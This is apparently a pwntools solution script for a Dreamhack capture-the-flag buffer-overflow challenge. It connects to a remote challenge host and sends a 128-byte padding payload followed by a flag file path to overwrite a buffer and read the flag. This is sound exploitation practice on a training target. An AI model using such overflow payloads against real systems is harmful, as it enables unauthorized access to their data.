from pwn import *

e = ELF('./deploy/bof')
libc = e.libc

# Local
#r = process('./basic_exploitation_002')

# Remote
r = remote('host3.dreamhack.games', 18382)

PAYLOAD = b'A' * 128 + b'/home/bof/flag'

r.sendlineafter(b'meow? ', PAYLOAD)

r.interactive()